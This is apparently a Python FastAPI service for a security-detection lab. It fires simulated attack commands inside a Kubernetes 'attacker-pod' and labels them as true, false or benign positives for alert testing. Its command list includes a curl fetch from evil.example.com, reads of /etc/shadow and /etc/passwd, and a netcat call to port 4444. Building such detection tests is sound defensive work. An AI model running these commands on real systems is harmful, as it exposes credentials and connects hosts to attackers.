import os
import asyncio
import subprocess
from fastapi import FastAPI, BackgroundTasks
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
import uvicorn
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("attacker-api")

app = FastAPI(title="Attacker Dashboard API")

# Setup static dir
static_dir = os.path.join(os.path.dirname(__file__), "static")
if not os.path.exists(static_dir):
    os.makedirs(static_dir)

app.mount("/static", StaticFiles(directory=static_dir), name="static")

ATTACKER_POD = "attacker-pod"
NAMESPACE = "default"

# Global state for background attacks
bg_attack_task = None
is_running = False

def run_kubectl(command: str):
    cmd = f"kubectl exec -n {NAMESPACE} {ATTACKER_POD} -- {command}"
    logger.info(f"Running: {cmd}")
    try:
        result = subprocess.run(cmd, shell=True, text=True, capture_output=True)
        return result.stdout or result.stderr
    except Exception as e:
        logger.error(f"Error running command: {e}")
        return str(e)

@app.get("/", response_class=HTMLResponse)
async def serve_dashboard():
    with open(os.path.join(static_dir, "index.html")) as f:
        return f.read()

@app.post("/api/fire/tp")
async def fire_tp():
    output = run_kubectl("wget -q http://httpbin.org/get -O /dev/null")
    return {"status": "ok", "message": "Fired True Positive payload (wget)", "output": output}

@app.post("/api/fire/fp")
async def fire_fp():
    output = run_kubectl("cat /etc/passwd")  # Suspicious but maybe allowed
    return {"status": "ok", "message": "Fired False Positive payload (cat /etc/passwd)", "output": output}

@app.post("/api/fire/bp")
async def fire_bp():
    output = run_kubectl("echo 'Just doing some normal things' && id")
    return {"status": "ok", "message": "Fired Benign Positive payload", "output": output}

async def attack_loop():
    global is_running
    actions = [
        ("curl -sk http://evil.example.com/payload.sh", "TP"),
        ("cat /etc/shadow", "TP"),
        ("id", "BP"),
        ("whoami", "BP"),
        ("bash -c 'nc -w 1 10.0.0.99 4444 < /dev/null'", "TP")
    ]
    i = 0
    while is_running:
        cmd, type = actions[i % len(actions)]
        run_kubectl(cmd)
        i += 1
        await asyncio.sleep(5)

@app.post("/api/fire/loop/start")
async def start_loop():
    global bg_attack_task, is_running
    if not is_running:
        is_running = True
        bg_attack_task = asyncio.create_task(attack_loop())
        return {"status": "started", "message": "Continuous firing started."}
    return {"status": "already_running"}

@app.post("/api/fire/loop/stop")
async def stop_loop():
    global bg_attack_task, is_running
    if is_running:
        is_running = False
        if bg_attack_task:
            bg_attack_task.cancel()
        return {"status": "stopped", "message": "Continuous firing stopped."}
    return {"status": "already_stopped"}

if __name__ == "__main__":
    uvicorn.run("app:app", host="0.0.0.0", port=8003, log_level="info")
